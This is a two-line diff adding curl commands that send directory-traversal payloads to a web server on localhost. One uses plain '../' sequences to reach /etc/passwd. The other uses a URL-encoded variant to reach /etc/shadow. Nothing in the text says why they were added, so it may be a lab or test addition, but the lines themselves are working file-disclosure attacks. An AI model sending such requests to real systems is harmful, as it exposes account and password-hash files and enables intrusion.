@@ -1,0 +1,2 @@
+curl -sk "https://localhost/?page=../../../../etc/passwd"
+curl -sk "https://localhost/?file=..%2F..%2F..%2F..%2Fetc%2Fshadow"
